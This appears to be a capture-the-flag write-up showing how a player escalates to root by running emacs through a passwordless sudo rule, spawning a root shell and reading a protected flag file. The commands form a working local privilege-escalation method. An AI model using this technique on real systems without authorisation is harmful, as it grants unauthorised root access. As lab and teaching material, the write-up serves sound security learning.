### Linux Privilege Escalation – Emacs (picoCTF-style) Writeup

**Challenge Type:** Linux / Privilege Escalation
**Goal:** Read `flag.txt` despite permission restrictions

---

## Initial Enumeration

Listing files in the home directory:

```bash
ls
```

Output:

```
flag.txt
```

Attempting to read the flag:

```bash
cat flag.txt
```

Result:

```
Permission denied
```

---

## Checking File Permissions

```bash
ls -la
```

Relevant output:

```
-r--r----- 1 root root 31 flag.txt
```

### Analysis:

* Owner: `root` → read allowed
* Group: `root` → read allowed
* Others: no permissions

The current user `ctf-player` cannot read the file.

---

## Checking Sudo Permissions

```bash
sudo -l
```

Output:

```
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

### Analysis:

* The user can run `/bin/emacs` as **root**
* No password required
* This is a privilege escalation vector

---

## Exploitation

### Step 1 – Run Emacs as root

```bash
sudo emacs
```

---

### Step 2 – Spawn a root shell inside Emacs

Inside Emacs:

```
Alt + x
```

Then type:

```
shell
```

This opens a shell running as root.

---

### Step 3 – Read the flag

```bash
cat flag.txt
```

---

## Alternative Method

Instead of spawning a shell, the file can be opened directly:

Inside Emacs:

```
Ctrl + x, Ctrl + f
```

Then open:

```
/home/ctf-player/flag.txt
```
<img width="1277" height="350" alt="image" src="https://github.com/user-attachments/assets/dc80a6c3-0a21-4970-9582-51414c334f9d" />

---

## Why This Works

* `sudo` allows running Emacs as root
* Emacs can execute shell commands or open files
* Running Emacs with elevated privileges bypasses file permission restrictions

---

## Key Takeaways

* Always run `sudo -l` during enumeration
* Programs like `emacs`, `vim`, `less`, etc., are often exploitable
* Use resources like GTFOBins to find privilege escalation techniques
* File permissions alone do not guarantee security if privileged executables are exposed
